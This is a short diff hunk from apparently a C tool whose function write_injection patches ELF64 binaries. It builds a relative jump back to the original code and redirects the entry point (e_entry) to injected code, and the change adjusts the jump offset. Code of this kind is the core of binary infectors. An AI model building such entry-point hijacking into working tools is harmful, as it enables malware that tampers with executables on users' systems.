@@ -96,7 +96,7 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, const c
 
     // Generating machine relative return 'jmp' insert
     char jump_back[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
-    *(Elf64_Word*) (jump_back + 1) = (Elf64_Word) jmp_offset - 5;
+    *(Elf64_Word*) (jump_back + 1) = (Elf64_Word) jmp_offset;
 
     // setting entry point to the injection
     header->e_entry = inj_vaddr;
